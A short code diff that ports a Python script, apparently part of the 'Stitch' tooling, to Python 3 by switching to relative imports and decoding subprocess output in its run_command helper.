@@ -21,8 +21,8 @@ from Crypto import Random # 该第三方库在win上需要VC++14.0进行编译
 from Crypto.Cipher import AES
 from getpass import getpass
 from colorama import Fore, Back, Style, init, deinit, reinit
-from Stitch_Vars.globals import *
-from Stitch_Vars.st_aes import *
+from .Stitch_Vars.globals import *
+from .Stitch_Vars.st_aes import *
 
 if sys.platform.startswith('win'):
     # 初始化彩色cmd
@@ -59,8 +59,8 @@ def run_command(command):
             if subp_output == '':
                 return '[+] Command successfully executed.\n'
             else:
-                return subp_output
-        return "[!] {}".format(errors)
+                return subp_output.decode()
+        return f"[!] {errors.decode()}"
     except KeyboardInterrupt:
         print('Terminated command.')
 
